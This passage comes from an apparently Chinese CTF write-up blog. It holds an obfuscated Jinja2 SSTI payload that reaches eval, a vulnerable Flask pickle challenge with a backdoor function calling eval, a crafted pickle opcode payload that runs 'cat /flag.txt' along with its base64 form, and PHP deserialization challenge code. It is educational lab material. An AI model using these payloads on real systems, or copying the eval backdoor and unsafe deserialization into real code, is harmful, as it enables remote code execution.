style="color:#f92672">=</span>dd)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cca<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(ca<span style="color:#f92672">=</span>aa,t<span style="color:#f92672">=</span>dd)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cflg<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(fl<span style="color:#f92672">=</span>aa,ag<span style="color:#f92672">=</span>dd)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cev<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(ev<span style="color:#f92672">=</span>aa,al<span style="color:#f92672">=</span>dd)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cred<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(re<span style="color:#f92672">=</span>aa,ad<span style="color:#f92672">=</span>dd)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cbul<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cxhx<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>but<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>xhx<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cini<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(ini<span style="color:#f92672">=</span>aa,t<span style="color:#f92672">=</span>bb)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cglo<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(glo<span style="color:#f92672">=</span>aa,bals<span style="color:#f92672">=</span>bb)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>citm<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(ite<span style="color:#f92672">=</span>aa,ms<span style="color:#f92672">=</span>bb)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cpld<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cxhx<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>imp<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>left<span style="color:#f92672">~</span>yin<span style="color:#f92672">~</span>so<span style="color:#f92672">~</span>yin<span style="color:#f92672">~</span>right<span style="color:#f92672">~</span>point<span style="color:#f92672">~</span>pon<span style="color:#f92672">~</span>left<span style="color:#f92672">~</span>yin<span style="color:#f92672">~</span>ca<span style="color:#f92672">~</span>space<span style="color:#f92672">~</span>slas<span style="color:#f92672">~</span>flg<span style="color:#f92672">~</span>yin<span style="color:#f92672">~</span>right<span style="color:#f92672">~</span>point<span style="color:#f92672">~</span>red<span style="color:#f92672">~</span>left<span style="color:#f92672">~</span>right<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cfor<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cf,v<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cin<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c(self<span style="color:#f92672">|</span>attr(xhx<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>ini<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>xhx)<span style="color:#f92672">|</span>attr(xhx<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>glo<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>xhx)<span style="color:#f92672">|</span>attr(itm))()<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cif<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cf<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">==%</span><span style="color:#ae81ff">0</span>cbul<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cfor<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>ca,b<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cin<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c(v<span style="color:#f92672">|</span>attr(itm))()<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cif<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>ca<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">==%</span><span style="color:#ae81ff">0</span>cev<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{{b(pld)}}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cendif<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cendfor<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cendif<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cendfor<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}
+</span></span></code></pre></div><h2 id="middle-pickle反序列化">middle <code>pickle反序列化</code></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> config
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, session, render_template, url_for,redirect,make_response
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RestrictedUnpickler</span>(pickle<span style="color:#f92672">.</span>Unpickler):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_class</span>(self, module, name):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> module <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;config&#39;</span>] <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;__&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> name:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> getattr(sys<span style="color:#f92672">.</span>modules[module], name)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> pickle<span style="color:#f92672">.</span>UnpicklingError(<span style="color:#e6db74">&#34;global &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">.</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39; is forbidden&#34;</span> <span style="color:#f92672">%</span> (module, name))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">restricted_loads</span>(s):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> RestrictedUnpickler(io<span style="color:#f92672">.</span>BytesIO(s))<span style="color:#f92672">.</span>load()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>():
+</span></span><span style="display:flex;"><span>    base_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> make_response(open(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(base_dir, __file__))<span style="color:#f92672">.</span>read()<span style="color:#f92672">+</span>open(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(base_dir, <span style="color:#e6db74">&#34;config/__init__.py&#34;</span>))<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/plain;charset=UTF-8&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/home&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>():
+</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;data&#39;</span>]
+</span></span><span style="display:flex;"><span>    User <span style="color:#f92672">=</span> restricted_loads(base64<span style="color:#f92672">.</span>b64decode(data))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> str(User)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">backdoor</span>(cmd):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 这里我也改了一下</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(cmd,list) :
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(cmd)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;!!!!!!!!!!&#34;</span>)
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">=</span>eval(s)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;??????&#34;</span>)
+</span></span></code></pre></div><p>之前就说学pickle反序列化来着，一搁置就忘掉了</p>
+<p>正好遇到这题，从最基础学习起来    推荐此文https://xz.aliyun.com/t/7436#toc-11</p>
+<blockquote>
+<p>题目是只给了config并且禁用下划线__ ,通过这个条件来执行命令</p>
+</blockquote>
+<p>可以通过 <code>config</code> 的 <code>backdoor(cmd)</code> 函数绕过。</p>
+<p>利用pker构造opcode：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>config_backdoor <span style="color:#f92672">=</span> GLOBAL(<span style="color:#e6db74">&#39;config&#39;</span>, <span style="color:#e6db74">&#39;backdoor&#39;</span>)
+</span></span><span style="display:flex;"><span>config_backdoor([<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).popen(&#39;cat /flag.txt&#39;).read()&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span>
+</span></span></code></pre></div><p>得到<code>b&quot;cconfig\nbackdoor\np0\n0g0\n((S'__import__(\\'os\\').popen(\\'cat /flag.txt\\').read()'\nltR.&quot;</code></p>
+<p>根据题意base64，用python进行编码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pybase64
+</span></span><span style="display:flex;"><span>data<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cconfig</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">backdoor</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">p0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">0g0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">((S&#39;__import__(</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;os</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;).popen(</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;cat /flag.txt</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;).read()&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">ltR.&#34;</span>
+</span></span><span style="display:flex;"><span>print(pybase64<span style="color:#f92672">.</span>b64encode(data))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Y2NvbmZpZwpiYWNrZG9vcgpwMAowZzAKKChTJ19faW1wb3J0X18oXCdvc1wnKS5wb3BlbihcJ2NhdCAvZmxhZy50eHRcJykucmVhZCgpJwpsdFIu&#39;</span>
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<h2 id="pharpop">PharPOP</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">waf</span>($data){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_array</span>($data)){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Cannot transfer arrays&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#39;</span>, $data)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;You can&#39;t do&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">air</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $p;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __set($p, $value) {
+</span></span><span style="display:flex;"><span>        $p <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">act</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#66d9ef">new</span> $p($value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">tree</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $name;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $act;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __call($name, $arg){
+</span></span><span style="display:flex;"><span>        $arg[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">-&gt;</span>$name;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">apple</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $xxx;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $flag;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($flag)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">xxx</span><span style="color:#f92672">-&gt;</span>$flag <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">flag</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">D</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $start;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct(){
+</span></span><span style="display:flex;"><span>        $data <span style="color:#f92672">=</span> $_POST[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">start</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;w&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">waf</span>($data);
+</span></span><span style="display:flex;"><span>            $filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">rand</span>())<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.jpg&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">file_put_contents</span>($filename, $data);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $filename;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">start</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">waf</span>($data);
+</span></span><span style="display:flex;"><span>            $f <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($data);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>($f){
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;It is file&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;You can look at the others&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">banana</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($name){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span>$name;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// flag in /
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">55</span>) {
+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_POST[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;str too long&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;start&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" data-title="Dest0g3 520迎新赛" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" data-title="Dest0g3 520迎新赛"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" data-title="Dest0g3 520迎新赛"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" data-title="Dest0g3 520迎新赛"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ctf/hitconctf/" class="prev" rel="prev" title="hitconCTF"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>hitconCTF</a>
+            <a href="/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/" class="next" rel="next" title="DASCTF2022十月赛">DASCTF2022十月赛<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
